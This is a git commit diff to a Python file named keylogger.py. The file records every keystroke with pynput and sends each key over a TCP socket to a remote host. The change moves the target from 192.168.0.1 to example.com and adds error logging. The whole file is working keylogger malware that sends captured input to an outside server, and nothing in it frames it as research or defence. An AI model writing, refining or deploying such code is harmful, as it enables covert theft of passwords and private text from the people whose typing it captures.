14fbe91bacc7d5e443e0432fdc7d552b57f6c126
Danilo Nori <55815889+DaniloNori@users.noreply.github.com>
2023-12-05 21:36:48 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,21 +1,32 @@
 import socket
 from pynput.keyboard import Listener
+import logging
 
-def send_to_server(server_ip, port, data):
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((server_ip, port))
-    client_socket.send(data.encode())
-    client_socket.close()
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.ERROR)
+handler = logging.FileHandler('keylogger.log')
+formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+
+def send_to_server(server_hostname, port, data):
+    
+    try:
+        server_ip = socket.gethostbyname(server_hostname)
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((server_ip, port))
+        client_socket.send(data.encode())
+    except Exception as e:
+        logger.error('Error sending data to the server: {}'.format(e))
+    finally:
+        client_socket.close()
 
 def write_to_file(key):
     keydata = str(key).replace("'", "")
-    try:
-        send_to_server("192.168.0.1", 1234, keydata)
-    except Exception as e:
-        print(f"Error sending data to the server: {e}")
+    send_to_server("example.com", 1234, keydata)
 
 try:
     with Listener(on_press=write_to_file) as listener:
         listener.join()
 except Exception as e:
-    print(f"Error: {e}")
+    logger.error('Error: {}'.format(e))
